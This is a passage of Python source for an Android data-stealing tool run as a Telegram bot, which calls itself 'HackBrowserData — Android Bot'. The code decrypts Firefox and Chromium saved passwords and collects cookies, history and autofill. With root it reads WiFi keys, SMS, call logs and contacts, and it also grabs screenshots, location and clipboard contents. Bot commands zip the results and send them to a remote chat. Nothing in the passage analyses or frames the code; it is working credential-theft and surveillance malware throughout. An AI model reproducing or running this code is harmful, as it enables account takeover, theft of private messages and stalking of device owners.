                     hmac_hash_module=hmac_mod)
        if cipher_oid == _OID_3DES:
            return DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
        else:
            return AES.new(key[:key_len], AES.MODE_CBC, iv).decrypt(ciphertext)
    except Exception:
        return None


def _ff_extract_cka_value(dec):
    if len(dec) >= 102:
        return dec[70:102], _OID_AES256_CBC
    if len(dec) >= 94:
        return dec[70:94], _OID_3DES
    if len(dec) >= 32:
        return dec[-32:], _OID_AES256_CBC
    return None, None


def get_firefox_master_key(profile_path):
    key4 = profile_path / 'key4.db'
    if not key4.exists():
        return None, None

    def _q(cur):
        try:
            cur.execute("SELECT item2 FROM metadata WHERE id='password'")
            row = cur.fetchone()
            if not row:
                return None, None
            check = _ff_pbes2_decrypt(bytes(row[0]))
            if check is None or b'password-check' not in check[:20]:
                return None, None

            cur.execute(
                "SELECT name FROM sqlite_master "
                "WHERE type='table' AND name='nssPrivate'"
            )
            if not cur.fetchone():
                return None, None

            cur.execute('SELECT a11 FROM nssPrivate')
            for (a11_blob,) in cur.fetchall():
                if not a11_blob:
                    continue
                dec = _ff_pbes2_decrypt(bytes(a11_blob))
                if dec is None:
                    continue
                key, oid = _ff_extract_cka_value(dec)
                if key:
                    return key, oid
        except Exception:
            pass
        return None, None

    tmp_dir = get_temp_dir()
    tmp     = tmp_dir / f'key4_{os.getpid()}.db'
    try:
        copied = False
        try:
            shutil.copy2(key4, tmp)
            copied = True
        except (PermissionError, OSError):
            pass
        if not copied:
            try:
                r = subprocess.run(
                    ['su', '-c', f'cp "{key4}" "{tmp}"'],
                    capture_output=True, timeout=10)
                copied = (r.returncode == 0 and tmp.exists())
            except Exception:
                pass
        if not copied:
            return None, None
        for suffix in ('-wal', '-shm'):
            sc = key4.parent / (key4.name + suffix)
            if sc.exists():
                dst_sc = tmp.parent / (tmp.name + suffix)
                try:
                    shutil.copy2(sc, dst_sc)
                except (PermissionError, OSError):
                    try:
                        subprocess.run(
                            ['su', '-c', f'cp "{sc}" "{dst_sc}"'],
                            capture_output=True, timeout=10)
                    except Exception:
                        pass
        conn = sqlite3.connect(str(tmp))
        try:
            conn.execute('PRAGMA wal_checkpoint(TRUNCATE)')
        except Exception:
            pass
        try:
            result = _q(conn.cursor())
        finally:
            conn.close()
        return result if result else (None, None)
    except Exception:
        return None, None
    finally:
        for suffix in ('', '-wal', '-shm'):
            try:
                (tmp.parent / (tmp.name + suffix)).unlink(missing_ok=True)
            except Exception:
                pass


def _ff_decrypt_field(b64_val, key, cipher_oid):
    try:
        blob = base64.b64decode(b64_val)
        _, outer, _      = _der_next(blob, 0)
        pos = 0
        _, enc_info, pos = _der_next(outer, pos)
        _, ciphertext, _ = _der_next(outer, pos)

        pos = 0
        _, oid_r, pos = _der_next(enc_info, pos)
        _, iv, _      = _der_next(enc_info, pos)
        field_oid     = _oid_str(oid_r)

        if field_oid == _OID_3DES or cipher_oid == _OID_3DES:
            plain = DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
        else:
            plain = AES.new(key[:32], AES.MODE_CBC, iv).decrypt(ciphertext)

        pad_len = plain[-1]
        if 1 <= pad_len <= 16:
            plain = plain[:-pad_len]
        return plain.decode('utf-8', errors='replace').strip('\x00')
    except Exception:
        return '[encrypted]'

# ====================== FIREFOX EXTRACTORS =======================


def get_firefox_passwords(profile):
    logins_json = profile / 'logins.json'
    if not logins_json.exists():
        return []
    key, oid = get_firefox_master_key(profile)
    passwords = []
    try:
        data = json.loads(logins_json.read_text(encoding='utf-8'))
        for login in data.get('logins', []):
            url = login.get('formSubmitURL') or login.get('hostname', '')
            eu  = login.get('encryptedUsername', '')
            ep  = login.get('encryptedPassword', '')
            if key:
                username = _ff_decrypt_field(eu, key, oid)
                password = _ff_decrypt_field(ep, key, oid)
            else:
                username = '[root required]'
                password = '[root required]'
            tc = login.get('timeCreated')
            passwords.append({
                'url':      url,
                'username': username,
                'password': password,
                'created':  str(datetime.fromtimestamp(tc / 1000)) if tc else '',
            })
    except Exception:
        pass
    return passwords


def get_firefox_cookies(profile):
    db = profile / 'cookies.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT host,name,value,path,expiry,isSecure,isHttpOnly '
                'FROM moz_cookies ORDER BY host'
            )
            for host, name, val, path, exp, sec, httpo in cur.fetchall():
                rows.append({
                    'host': host, 'name': name, 'value': val or '',
                    'path': path,
                    'expires':  str(datetime.fromtimestamp(exp)) if exp else '',
                    'secure':   bool(sec),
                    'httponly': bool(httpo),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_history(profile):
    db = profile / 'places.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT url,title,visit_count,last_visit_date '
                'FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000'
            )
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    'url':        url,
                    'title':      title or '',
                    'visits':     vc,
                    'last_visit': str(datetime.fromtimestamp(lv / 1_000_000)) if lv else '',
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_bookmarks(profile):
    db = profile / 'places.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT b.title, p.url, b.dateAdded '
                'FROM moz_bookmarks b '
                'INNER JOIN moz_places p ON b.fk = p.id '
                'WHERE b.type = 1 ORDER BY b.dateAdded DESC'
            )
            for title, url, da in cur.fetchall():
                rows.append({
                    'name':  title or '',
                    'url':   url,
                    'added': str(datetime.fromtimestamp(da / 1_000_000)) if da else '',
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)

# ========================= DATA COLLECTION =======================


# ========================= DATA COLLECTION =======================


# =================== ENHANCED ANDROID FEATURES ==================

def get_screenshot():
    """Capture screenshot using screencap (requires shell access)."""
    try:
        temp_path = get_temp_dir() / f'screenshot_{int(time.time())}.png'
        cmd = ['screencap', '-p', str(temp_path)]
        
        # Try direct screencap first
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=10)
            if r.returncode == 0 and temp_path.exists():
                return temp_path
        except Exception:
            pass
        
        # Try with su if root available
        if ROOT_MODE or _detect_root():
            try:
                r = subprocess.run(
                    ['su', '-c', f'screencap -p {temp_path}'],
                    capture_output=True, timeout=10
                )
                if r.returncode == 0 and temp_path.exists():
                    return temp_path
            except Exception:
                pass
        
        # Try ADB if available
        if _detect_adb():
            try:
                subprocess.run(
                    ['adb', 'shell', 'screencap', '-p', '/sdcard/screenshot_temp.png'],
                    capture_output=True, timeout=10
                )
                subprocess.run(
                    ['adb', 'pull', '/sdcard/screenshot_temp.png', str(temp_path)],
                    capture_output=True, timeout=10
                )
                if temp_path.exists():
                    return temp_path
            except Exception:
                pass
    except Exception as e:
        print(f'[screenshot] Failed: {e}')
    return None


def get_wifi_passwords():
    """Extract saved WiFi credentials (requires root)."""
    wifi_creds = []
    
    if not (ROOT_MODE or _detect_root()):
        return {'error': 'Root access required for WiFi passwords'}
    
    # Method 1: Parse wpa_supplicant.conf
    conf_paths = [
        '/data/misc/wifi/wpa_supplicant.conf',
        '/data/misc/wpa_supplicant/wpa_supplicant.conf',
        '/data/wifi/bcm_supp.conf',
    ]
    
    for conf_path in conf_paths:
        try:
            r = subprocess.run(
                ['su', '-c', f'cat {conf_path}'],
                capture_output=True, text=True, timeout=10
            )
            if r.returncode == 0 and r.stdout:
                content = r.stdout
                networks = []
                current = {}
                
                for line in content.splitlines():
                    line = line.strip()
                    if line.startswith('network={'):
                        current = {}
                    elif line.startswith('}') and current:
                        networks.append(current.copy())
                        current = {}
                    elif '=' in line:
                        key, val = line.split('=', 1)
                        key = key.strip()
                        val = val.strip().strip('"')
                        if key in ('ssid', 'psk', 'password', 'key_mgmt'):
                            current[key] = val
                
                wifi_creds.extend(networks)
        except Exception:
            pass
    
    # Method 2: Use dumpsys wifi (less reliable for passwords)
    try:
        r = subprocess.run(
            ['su', '-c', 'dumpsys wifi'],
            capture_output=True, text=True, timeout=15
        )
        if r.returncode == 0 and r.stdout:
            # Parse SSID info from dumpsys output
            for line in r.stdout.splitlines():
                if 'SSID:' in line or 'ssid=' in line:
                    # Extract SSID but password won't be in dumpsys
                    pass
    except Exception:
        pass
    
    return {'networks': wifi_creds, 'count': len(wifi_creds)}


def get_sms_messages(limit=500):
    """Extract SMS messages (requires root)."""
    if not (ROOT_MODE or _detect_root()):
        return {'error': 'Root access required for SMS'}
    
    messages = []
    db_path = '/data/data/com.android.providers.telephony/databases/mmssms.db'
    
    try:
        temp_db = get_temp_dir() / 'mmssms_temp.db'
        r = subprocess.run(
            ['su', '-c', f'cp {db_path} {temp_db}'],
            capture_output=True, timeout=10
        )
        
        if r.returncode != 0 or not temp_db.exists():
            return {'error': 'Cannot access SMS database'}
        
        # Make readable
        subprocess.run(['su', '-c', f'chmod 644 {temp_db}'], capture_output=True, timeout=5)
        
        def _extract(cur):
            cur.execute(f'''
                SELECT address, body, date, type, read
                FROM sms
                ORDER BY date DESC
                LIMIT {limit}
            ''')
            for row in cur.fetchall():
                messages.append({
                    'number': row[0],
                    'body': row[1],
                    'date': datetime.fromtimestamp(row[2] / 1000) if row[2] else None,
                    'type': 'received' if row[3] == 1 else 'sent' if row[3] == 2 else 'draft',
                    'read': bool(row[4])
                })
        
        _with_db(temp_db, _extract)
        temp_db.unlink(missing_ok=True)
        
    except Exception as e:
        return {'error': f'SMS extraction failed: {e}'}
    
    return {'messages': messages, 'count': len(messages)}


def get_call_logs(limit=500):
    """Extract call history (requires root)."""
    if not (ROOT_MODE or _detect_root()):
        return {'error': 'Root access required for call logs'}
    
    calls = []
    db_path = '/data/data/com.android.providers.contacts/databases/calllog.db'
    
    try:
        temp_db = get_temp_dir() / 'calllog_temp.db'
        r = subprocess.run(
            ['su', '-c', f'cp {db_path} {temp_db}'],
            capture_output=True, timeout=10
        )
        
        if r.returncode != 0 or not temp_db.exists():
            return {'error': 'Cannot access call log database'}
        
        subprocess.run(['su', '-c', f'chmod 644 {temp_db}'], capture_output=True, timeout=5)
        
        def _extract(cur):
            cur.execute(f'''
                SELECT number, date, duration, type, name
                FROM calls
                ORDER BY date DESC
                LIMIT {limit}
            ''')
            for row in cur.fetchall():
                calls.append({
                    'number': row[0],
                    'date': datetime.fromtimestamp(row[1] / 1000) if row[1] else None,
                    'duration': row[2],
                    'type': 'incoming' if row[3] == 1 else 'outgoing' if row[3] == 2 else 'missed',
                    'contact_name': row[4]
                })
        
        _with_db(temp_db, _extract)
        temp_db.unlink(missing_ok=True)
        
    except Exception as e:
        return {'error': f'Call log extraction failed: {e}'}
    
    return {'calls': calls, 'count': len(calls)}


def get_contacts():
    """Extract contacts (requires root)."""
    if not (ROOT_MODE or _detect_root()):
        return {'error': 'Root access required for contacts'}
    
    contacts = []
    db_path = '/data/data/com.android.providers.contacts/databases/contacts2.db'
    
    try:
        temp_db = get_temp_dir() / 'contacts_temp.db'
        r = subprocess.run(
            ['su', '-c', f'cp {db_path} {temp_db}'],
            capture_output=True, timeout=10
        )
        
        if r.returncode != 0 or not temp_db.exists():
            return {'error': 'Cannot access contacts database'}
        
        subprocess.run(['su', '-c', f'chmod 644 {temp_db}'], capture_output=True, timeout=5)
        
        def _extract(cur):
            # Simplified query - contacts DB schema is complex
            cur.execute('''
                SELECT display_name, data1, data2, data3
                FROM view_data
                WHERE mimetype IN ('vnd.android.cursor.item/phone_v2', 
                                  'vnd.android.cursor.item/email_v2')
                ORDER BY display_name
                LIMIT 1000
            ''')
            contact_map = {}
            for row in cur.fetchall():
                name = row[0]
                data = row[1]  # phone or email
                if name not in contact_map:
                    contact_map[name] = {'name': name, 'numbers': [], 'emails': []}
                if '@' in str(data):
                    contact_map[name]['emails'].append(data)
                else:
                    contact_map[name]['numbers'].append(data)
            
            contacts.extend(contact_map.values())
        
        _with_db(temp_db, _extract)
        temp_db.unlink(missing_ok=True)
        
    except Exception as e:
        return {'error': f'Contacts extraction failed: {e}'}
    
    return {'contacts': contacts, 'count': len(contacts)}


def get_installed_apps():
    """List all installed packages with detailed info."""
    apps = []
    
    try:
        # Get basic package list
        r = subprocess.run(
            ['pm', 'list', 'packages', '-f'],
            capture_output=True, text=True, timeout=15
        )
        
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if line.startswith('package:'):
                    parts = line[8:].split('=')
                    if len(parts) == 2:
                        apps.append({
                            'package': parts[1],
                            'path': parts[0]
                        })
        
        # Enrich with version and permission info
        for app in apps[:100]:  # Limit to avoid timeout
            try:
                r = subprocess.run(
                    ['dumpsys', 'package', app['package']],
                    capture_output=True, text=True, timeout=5
                )
                if r.returncode == 0:
                    for line in r.stdout.splitlines():
                        if 'versionName=' in line:
                            app['version'] = line.split('versionName=')[1].strip()
                        elif 'userId=' in line:
                            app['uid'] = line.split('userId=')[1].split()[0]
            except Exception:
                pass
                
    except Exception as e:
        return {'error': f'App enumeration failed: {e}'}
    
    return {'apps': apps, 'count': len(apps)}


def get_location():
    """Get current device location (best effort)."""
    location = {}
    
    try:
        # Try dumpsys location
        r = subprocess.run(
            ['dumpsys', 'location'],
            capture_output=True, text=True, timeout=10
        )
        
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if 'mLastLocation' in line or 'Location[' in line:
                    # Parse location from line
                    if 'lat=' in line.lower() and 'lon=' in line.lower():
                        try:
                            lat = line.split('lat=')[1].split()[0].strip(',')
                            lon = line.split('lon=')[1].split()[0].strip(',')
                            location['latitude'] = lat
                            location['longitude'] = lon
                        except Exception:
                            pass
        
        # Try getprop for cell tower info
        r = subprocess.run(
            ['getprop', 'gsm.operator.alpha'],
            capture_output=True, text=True, timeout=5
        )
        if r.returncode == 0:
            location['carrier'] = r.stdout.strip()
            
    except Exception as e:
        location['error'] = str(e)
    
    return location


def get_clipboard():
    """Get current clipboard content."""
    try:
        r = subprocess.run(
            ['cmd', 'clipboard', 'get'],
            capture_output=True, text=True, timeout=5
        )
        if r.returncode == 0:
            return {'content': r.stdout, 'timestamp': datetime.now()}
    except Exception:
        pass
    
    # Try with su
    if ROOT_MODE or _detect_root():
        try:
            r = subprocess.run(
                ['su', '-c', 'cmd clipboard get'],
                capture_output=True, text=True, timeout=5
            )
            if r.returncode == 0:
                return {'content': r.stdout, 'timestamp': datetime.now()}
        except Exception:
            pass
    
    return {'error': 'Cannot access clipboard'}


def detect_magisk():
    """Enhanced root detection for Magisk, SuperSU, KernelSU."""
    root_indicators = {
        'magisk': False,
        'supersu': False,
        'kernelsu': False,
        'su_binary': None,
        'methods': []
    }
    
    # Check for Magisk
    magisk_paths = [
        '/data/adb/magisk',
        '/sbin/.magisk',
        '/cache/.magisk',
        '/data/magisk',
    ]
    for path in magisk_paths:
        if Path(path).exists():
            root_indicators['magisk'] = True
            root_indicators['methods'].append(f'Magisk path: {path}')
            break
    
    # Check for SuperSU
    supersu_paths = [
        '/system/app/SuperSU',
        '/system/xbin/daemonsu',
        '/data/data/eu.chainfire.supersu',
    ]
    for path in supersu_paths:
        if Path(path).exists():
            root_indicators['supersu'] = True
            root_indicators['methods'].append(f'SuperSU path: {path}')
            break
    
    # Check for KernelSU
    kernelsu_paths = [
        '/data/adb/ksu',
        '/data/adb/ksud',
    ]
    for path in kernelsu_paths:
        if Path(path).exists():
            root_indicators['kernelsu'] = True
            root_indicators['methods'].append(f'KernelSU path: {path}')
            break
    
    # Check for su binaries
    su_paths = [
        '/system/bin/su',
        '/system/xbin/su',
        '/sbin/su',
        '/magisk/.core/bin/su',
        '/su/bin/su',
    ]
    for su_path in su_paths:
        if Path(su_path).exists():
            root_indicators['su_binary'] = su_path
            root_indicators['methods'].append(f'su binary: {su_path}')
            break
    
    # Try to execute su
    if _detect_root():
        root_indicators['methods'].append('su execution successful')
    
    return root_indicators


def collect_all():
    _kill_browsers()
    result = {
        'system':    system_info(),
        'browsers':  {},
        'timestamp': datetime.now().isoformat(),
    }
    paths = find_browser_paths()

    for browser, path_or_list in paths.items():
        result['browsers'][browser] = {}
        try:
            is_ff = ('firefox' in browser or 'fenix' in browser
                     or (isinstance(path_or_list, Path)
                         and not isinstance(path_or_list, list)))

            if is_ff and not isinstance(path_or_list, list):
                base     = path_or_list
                profiles = find_firefox_profiles(base)
                for prof in profiles:
                    result['browsers'][browser][prof.name] = {
                        'passwords': get_firefox_passwords(prof),
                        'cookies':   get_firefox_cookies(prof),
                        'history':   get_firefox_history(prof),
                        'bookmarks': get_firefox_bookmarks(prof),
                    }
            else:
                profiles = path_or_list if isinstance(path_or_list, list) else [path_or_list]
                for prof in profiles:
                    key = chromium_master_key_android(prof)
                    result['browsers'][browser][prof.name] = {
                        'passwords': get_chromium_passwords(prof, key),
                        'cookies':   get_chromium_cookies(prof, key),
                        'history':   get_chromium_history(prof),
                        'bookmarks': get_chromium_bookmarks(prof),
                        'autofill':  get_chromium_autofill(prof),
                    }
        except Exception as e:
            result['browsers'][browser]['error'] = str(e)

    if not result['browsers'] or all(
        not any(isinstance(v, dict) and v for v in bd.values())
        for bd in result['browsers'].values()
    ):
        if _detect_adb():
            print('[collect] Direct access yielded nothing, trying ADB backup...')
            adb_browsers = _collect_via_adb_backup()
            result['browsers'].update(adb_browsers)
            if adb_browsers:
                result['note'] = 'Data extracted via ADB backup (no root)'
        if not result['browsers']:
            result['note'] = (
                'No browser data found. '
                'Enable Wireless Debugging (Developer Options) for ADB backup extraction, '
                'or use a rooted device for full access.'
            )

    return result


def _count(data, key):
    n = 0
    for pdict in data['browsers'].values():
        for pdata in pdict.values():
            if isinstance(pdata, dict):
                n += len(pdata.get(key, []))
    return n


def make_zip(data):
    tmp_dir  = Path(tempfile.mkdtemp(dir=str(get_temp_dir())))
    try:
        files = {}
        si    = data['system']
        files['system_info.txt'] = '\n'.join(f"{k}: {v}" for k, v in si.items())
        if data.get('note'):
            files['system_info.txt'] += f"\n\nNOTE: {data['note']}"
        files['full_data.json'] = json.dumps(data, indent=2, default=str)

        for browser, prof_dict in data['browsers'].items():
            for prof_name, pdata in prof_dict.items():
                if not isinstance(pdata, dict):
                    continue
                pfx = f"{browser}_{prof_name}"

                if pdata.get('passwords'):
                    txt = f"=== {browser.upper()} — {prof_name} PASSWORDS ===\n\n"
                    for p in pdata['passwords']:
                        txt += (f"URL:      {p['url']}\n"
                                f"Username: {p['username']}\n"
                                f"Password: {p['password']}\n\n")
                    files[f"{pfx}_passwords.txt"] = txt

                if pdata.get('cookies'):
                    txt = (f"=== {browser.upper()} — {prof_name} COOKIES "
                           f"({len(pdata['cookies'])}) ===\n\n")
                    for c in pdata['cookies'][:500]:
                        txt += (f"Host:  {c['host']}\n"
                                f"Name:  {c['name']}\n"
                                f"Value: {str(c.get('value',''))[:200]}\n\n")
                    files[f"{pfx}_cookies.txt"] = txt

                if pdata.get('history'):
                    txt = (f"=== {browser.upper()} — {prof_name} HISTORY "
                           f"({len(pdata['history'])}) ===\n\n")
                    for h in pdata['history'][:500]:
                        txt += (f"URL:   {h['url']}\n"
                                f"Title: {h.get('title','')}\n"
                                f"Last:  {h.get('last_visit','')}\n\n")
                    files[f"{pfx}_history.txt"] = txt

                if pdata.get('bookmarks'):
                    txt = f"=== {browser.upper()} — {prof_name} BOOKMARKS ===\n\n"
                    for b in pdata['bookmarks']:
                        txt += (f"Name:   {b.get('name','')}\n"
                                f"URL:    {b.get('url','')}\n\n")
                    files[f"{pfx}_bookmarks.txt"] = txt

                if pdata.get('autofill'):
                    txt = (f"=== {browser.upper()} — {prof_name} AUTOFILL "
                           f"({len(pdata['autofill'])}) ===\n\n")
                    for a in pdata['autofill'][:200]:
                        txt += (f"Field: {a['field']}\nValue: {a['value']}\n"
                                f"Count: {a['count']}\n\n")
                    files[f"{pfx}_autofill.txt"] = txt

        for fname, content in files.items():
            (tmp_dir / fname).write_text(content, encoding='utf-8')

        hostname = si.get('hostname', 'android') or 'android'
        zip_name = f"android_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        zip_path = get_temp_dir() / zip_name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in tmp_dir.iterdir():
                zf.write(f, f.name)
        return zip_path
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

# ====================== BOT COMMAND HANDLERS =====================


def handle_command(text, chat_id):
    # Strip @BotName suffix and extract command word
    cmd = text.split()[0].split('@')[0].lower().strip()

    if cmd in ('/start', '/help'):
        if ROOT_MODE:
            access_note = '✓ Root mode ENABLED'
        elif _detect_adb():
            access_note = '✓ ADB backup mode (wireless debugging)'
        else:
            access_note = '⚠️ Limited mode — enable Wireless Debugging for ADB backup'
        send_message(
            f'<b>HackBrowserData — Android Bot (Enhanced)</b>\n\n'
            f'{access_note}\n\n'
            '<b>Browser Data:</b>\n'
            '/extract  — Collect all browser data (ZIP)\n'
            '/browsers — List detected browsers\n\n'
            '<b>System Intelligence:</b>\n'
            '/info     — System information\n'
            '/rootcheck — Analyze root access\n'
            '/apps     — List installed apps\n'
            '/location — Device location\n'
            '/status   — Bot status\n\n'
            '<b>Communications (requires root):</b>\n'
            '/sms      — Extract SMS messages\n'
            '/calls    — Extract call history\n'
            '/contacts — Extract contacts\n\n'
            '<b>Network & Capture:</b>\n'
            '/wifi     — Extract WiFi passwords (root)\n'
            '/screenshot — Capture screen\n'
            '/clipboard — Read clipboard\n\n'
            '/help     — This message',
            chat_id
        )

    elif cmd == '/extract':
        send_message('⏳ Collecting browser data… (this may take a moment on mobile)', chat_id)
        zip_path = None
        try:
            data     = collect_all()
            zip_path = make_zip(data)
            stats = (
                f'<b>✅ Extraction complete</b>\n\n'
                f'<b>Device:</b>      {data["system"].get("hostname")}\n'
                f'<b>Environment:</b> {data["system"].get("environment")}\n'
                f'<b>Access:</b>      {data["system"].get("access")}\n'
                f'<b>Passwords:</b>   {_count(data,"passwords")}\n'
                f'<b>Cookies:</b>     {_count(data,"cookies")}\n'
                f'<b>History URLs:</b>{_count(data,"history")}\n'
                f'<b>Bookmarks:</b>  {_count(data,"bookmarks")}\n'
                f'<b>Autofill:</b>   {_count(data,"autofill")}'
            )
            if data.get('note'):
                stats += f'\n\n<i>⚠️ {data["note"]}</i>'
            send_message(stats, chat_id)
            send_file(str(zip_path), chat_id, 'Browser data')
        except Exception as e:
            send_message(f'❌ Error during extraction: {e}', chat_id)
        finally:
            if zip_path:
                try:
                    zip_path.unlink()
                except Exception:
                    pass

    elif cmd == '/info':
        info = system_info()
        send_message(
            '<b>System Information:</b>\n' +
            '\n'.join(f'<b>{k}:</b> {v}' for k, v in info.items()),
            chat_id
        )

    elif cmd == '/browsers':
        send_message('🔍 Scanning for browser data…', chat_id)
        paths = find_browser_paths()
        if not paths:
            msg = (
                '<b>No browser data found.</b>\n\n'
                '<i>On non-rooted Android, browser data is protected.\n'
                'Set ROOT_MODE=True in Termux with root access for full access.</i>'
            )
            send_message(msg, chat_id)
            return
        txt = f'<b>Accessible browser data: {len(paths)} source(s)</b>\n\n'
        for b, p in paths.items():
            if isinstance(p, list):
                txt += f'✓ <b>{b}</b> ({len(p)} location(s))\n'
            else:
                txt += f'✓ <b>{b}</b> (Firefox-based)\n'
        send_message(txt, chat_id)

    elif cmd == '/status':
        si = system_info()
        send_message(
            f'<b>Status:</b> Running\n'
            f'<b>Environment:</b> {si["environment"]}\n'
            f'<b>Access:</b> {si["access"]}\n'
            f'<b>Python:</b> {sys.version.split()[0]}\n'
            f'<b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            chat_id
        )

    elif cmd == '/screenshot':
        send_message('📸 Capturing screenshot…', chat_id)
        try:
            screenshot_path = get_screenshot()
            if screenshot_path:
                send_file(str(screenshot_path), chat_id, 'Screenshot')
                screenshot_path.unlink(missing_ok=True)
            else:
                send_message('❌ Screenshot failed (requires shell access)', chat_id)
        except Exception as e:
            send_message(f'❌ Screenshot error: {e}', chat_id)

    elif cmd == '/wifi':
        send_message('📶 Extracting WiFi credentials…', chat_id)
        try:
            wifi_data = get_wifi_passwords()
            if 'error' in wifi_data:
                send_message(f'❌ {wifi_data["error"]}', chat_id)
            elif wifi_data['count'] == 0:
                send_message('⚠️ No WiFi networks found', chat_id)
            else:
                msg = f'<b>🔑 WiFi Networks: {wifi_data["count"]}</b>\n\n'
                for net in wifi_data['networks'][:20]:  # Limit display
                    ssid = net.get('ssid', 'Unknown')
                    psk = net.get('psk', net.get('password', 'N/A'))
                    key_mgmt = net.get('key_mgmt', 'Unknown')
                    msg += f'<b>SSID:</b> {ssid}\n<b>Key:</b> <code>{psk}</code>\n<b>Type:</b> {key_mgmt}\n\n'
                send_message(msg, chat_id)
        except Exception as e:
            send_message(f'❌ WiFi extraction error: {e}', chat_id)

    elif cmd == '/sms':
        send_message('💬 Extracting SMS messages…', chat_id)
        try:
            sms_data = get_sms_messages(limit=200)
            if 'error' in sms_data:
                send_message(f'❌ {sms_data["error"]}', chat_id)
            elif sms_data['count'] == 0:
                send_message('⚠️ No SMS messages found', chat_id)
            else:
                msg = f'<b>📱 SMS Messages: {sms_data["count"]}</b>\n\n'
                for sms in sms_data['messages'][:15]:  # Limit display
                    num = sms.get('number', 'Unknown')
                    body = sms.get('body', '')[:100]  # Truncate
                    date = sms.get('date', 'Unknown')
                    typ = sms.get('type', 'unknown')
                    msg += f'<b>From/To:</b> {num}\n<b>Type:</b> {typ}\n<b>Date:</b> {date}\n<b>Body:</b> {body}...\n\n'
                send_message(msg, chat_id)
        except Exception as e:
            send_message(f'❌ SMS extraction error: {e}', chat_id)

    elif cmd == '/calls':
        send_message('📞 Extracting call history…', chat_id)
        try:
            call_data = get_call_logs(limit=200)
            if 'error' in call_data:
                send_message(f'❌ {call_data["error"]}', chat_id)
            elif call_data['count'] == 0:
                send_message('⚠️ No call history found', chat_id)
            else:
                msg = f'<b>📞 Call Log: {call_data["count"]}</b>\n\n'
                for call in call_data['calls'][:20]:
                    num = call.get('number', 'Unknown')
                    date = call.get('date', 'Unknown')
                    dur = call.get('duration', 0)
                    typ = call.get('type', 'unknown')
                    name = call.get('contact_name', '')
                    msg += f'<b>Number:</b> {num}\n'
                    if name:
                        msg += f'<b>Contact:</b> {name}\n'
                    msg += f'<b>Type:</b> {typ}\n<b>Duration:</b> {dur}s\n<b>Date:</b> {date}\n\n'
                send_message(msg, chat_id)
        except Exception as e:
            send_message(f'❌ Call log extraction error: {e}', chat_id)

    elif cmd == '/contacts':
        send_message('👥 Extracting contacts…', chat_id)
        try:
            contact_data = get_contacts()
            if 'error' in contact_data:
                send_message(f'❌ {contact_data["error"]}', chat_id)
            elif contact_data['count'] == 0:
                send_message('⚠️ No contacts found', chat_id)
            else:
                msg = f'<b>👥 Contacts: {contact_data["count"]}</b>\n\n'
                for contact in contact_data['contacts'][:25]:
                    name = contact.get('name', 'Unknown')
                    numbers = ', '.join(contact.get('numbers', []))[:50]
                    emails = ', '.join(contact.get('emails', []))[:50]
                    msg += f'<b>{name}</b>\n'
                    if numbers:
                        msg += f'📱 {numbers}\n'
                    if emails:
                        msg += f'📧 {emails}\n'
                    msg += '\n'
                send_message(msg, chat_id)
        except Exception as e:
            send_message(f'❌ Contacts extraction error: {e}', chat_id)

    elif cmd == '/apps':
        send_message('📦 Enumerating installed apps…', chat_id)
        try:
            app_data = get_installed_apps()
            if 'error' in app_data:
                send_message(f'❌ {app_data["error"]}', chat_id)
            elif app_data['count'] == 0:
                send_message('⚠️ No apps found', chat_id)
            else:
                msg = f'<b>📦 Installed Apps: {app_data["count"]}</b>\n\n'
                # Show first 30 apps
                for app in app_data['apps'][:30]:
                    pkg = app.get('package', 'Unknown')
                    ver = app.get('version', '')
                    msg += f'• <code>{pkg}</code>'
                    if ver:
                        msg += f' ({ver})'
                    msg += '\n'
                if app_data['count'] > 30:
                    msg += f'\n... and {app_data["count"] - 30} more'
                send_message(msg, chat_id)
        except Exception as e:
            send_message(f'❌ App enumeration error: {e}', chat_id)

    elif cmd == '/location':
        send_message('🌍 Getting device location…', chat_id)
        try:
            loc = get_location()
            if 'error' in loc:
                send_message(f'❌ Location error: {loc["error"]}', chat_id)
            elif 'latitude' in loc and 'longitude' in loc:
                lat = loc['latitude']
                lon = loc['longitude']
                carrier = loc.get('carrier', 'Unknown')
                msg = (f'<b>📍 Location:</b>\n'
                       f'<b>Lat:</b> {lat}\n'
                       f'<b>Lon:</b> {lon}\n'
                       f'<b>Carrier:</b> {carrier}\n\n'
                       f'<a href="https://www.google.com/maps?q={lat},{lon}">View on Google Maps</a>')
                send_message(msg, chat_id)
            else:
                send_message('⚠️ Location not available', chat_id)
        except Exception as e:
            send_message(f'❌ Location error: {e}', chat_id)

    elif cmd == '/clipboard':
        send_message('📋 Reading clipboard…', chat_id)
        try:
            clip = get_clipboard()
            if 'error' in clip:
                send_message(f'❌ {clip["error"]}', chat_id)
            elif clip.get('content'):
                content = clip['content'][:500]  # Truncate
                send_message(f'<b>📋 Clipboard:</b>\n<pre>{content}</pre>', chat_id)
            else:
                send_message('⚠️ Clipboard is empty', chat_id)
        except Exception as e:
            send_message(f'❌ Clipboard error: {e}', chat_id)

    elif cmd == '/rootcheck':
        send_message('🔓 Analyzing root access…', chat_id)
        try:
            root_info = detect_magisk()
            msg = '<b>🔓 Root Analysis:</b>\n\n'
            msg += f'<b>Magisk:</b> {"✓ Detected" if root_info["magisk"] else "✗ Not found"}\n'
            msg += f'<b>SuperSU:</b> {"✓ Detected" if root_info["supersu"] else "✗ Not found"}\n'
            msg += f'<b>KernelSU:</b> {"✓ Detected" if root_info["kernelsu"] else "✗ Not found"}\n'
            if root_info['su_binary']:
                msg += f'<b>su binary:</b> <code>{root_info["su_binary"]}</code>\n'
